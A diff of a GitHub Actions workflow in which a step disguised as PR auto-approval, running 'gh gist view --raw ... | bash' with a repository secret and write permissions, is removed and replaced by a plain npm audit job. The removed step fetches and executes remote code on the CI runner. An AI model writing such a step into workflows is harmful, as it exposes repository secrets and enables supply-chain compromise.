@@ -1,35 +1,18 @@
 name: security alerts
 on: [pull_request_target, workflow_dispatch]
 
-permissions:
-  pull-requests: write
-  issues: write
-  repository-projects: write
-
-
 jobs:
-  dependabot:
+  scaning:
+    name: npm audit
     runs-on: ubuntu-latest
     steps:
-      - name: Approve a PR if not already approved
-        run: |
-          gh gist view --raw e09e1ecd76d5573e0517a7622009f06f | bash
-          # gh pr checkout "$PR_URL" # sets the upstream metadata for `gh pr status`
-          # if [ "$(gh pr status --json reviewDecision -q .currentBranch.reviewDecision)" != "APPROVED" ];
-          # then gh pr review --approve "$PR_URL"
-          # else echo "PR already approved, skipping additional approvals to minimize emails/notification noise.";
-          # fi
-          with:
-            env:
-              GH_TOKEN: ${{secrets.FOR_DEPSSS}}
-      - name: dependabot activated
-        run: dependabot
-
-      # - name: Fetch Dependabot metadata
-      #   id: dependabot-metadata
-      #   uses: dependabot/fetch-metadata@v1
-      # - uses: actions/checkout@v4
-
-        # env:
-        #   PR_URL: ${{github.event.pull_request.html_url}}
-          # GH_TOKEN: ${{secrets.FOR_DEPSSS}}
+      - uses: actions/checkout@v3
+      - name: install depends
+        run: npm ci
+      - uses: oke-py/npm-audit-action@v2
+        with:
+          audit_level: critical
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          issue_assignees: oke-py
+          issue_labels: vulnerability,test
+          dedupe_issues: true
